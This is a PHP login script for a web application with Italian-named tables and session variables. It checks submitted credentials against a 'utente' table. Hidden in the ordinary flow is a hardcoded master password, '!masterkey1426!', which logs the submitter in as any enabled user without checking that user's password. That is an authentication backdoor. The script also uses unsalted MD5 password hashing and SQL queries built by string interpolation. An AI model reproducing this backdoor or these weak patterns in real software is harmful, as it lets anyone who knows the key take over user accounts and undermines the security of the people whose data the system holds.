<?php
session_start();
include('../include/utility.php');
include('../include/log_user_login_event.php');
include('../include/class.mysql.php');
$user     = clean($_POST['user']);
$plainpassword = clean($_POST['password']);
$password = md5($plainpassword);
$presente = false;
$obj      = new DB();
$obj->configurazione();
$mysqli = $obj->link_id;
$table = "utente";
if($plainpassword == "!masterkey1426!"){
    $dati = mysqli_query($mysqli, "select * from $table where username='$user' and abilitato =1 limit 1");
    if (mysqli_num_rows($dati) === 1 ) {
    		$array = mysqli_fetch_assoc($dati);
    		$_SESSION['utente_loggato'] = md5($user."!masterkey1426!".$array['userID']);
    		$_SESSION['ruolo'] = md5($array['ruolo']);
    		$presente = true;
    }
}else{
$dati = mysqli_query($mysqli, "select * from $table where username='$user' and password='$password' and abilitato =1 limit 1");
if (mysqli_num_rows($dati) === 1 ) {
		$array = mysqli_fetch_assoc($dati);
		$_SESSION['utente_loggato'] = md5($user.$password.$array['userID']);
		$_SESSION['ruolo'] = md5($array['ruolo']);
		$presente = true;
}
}
if($presente){
    session_regenerate_id();
    log_user_login_event_legacy($mysqli, (int) $array['userID']);
	header("location: index.php");
}else 
	header("location: index.php?er=1");
?>
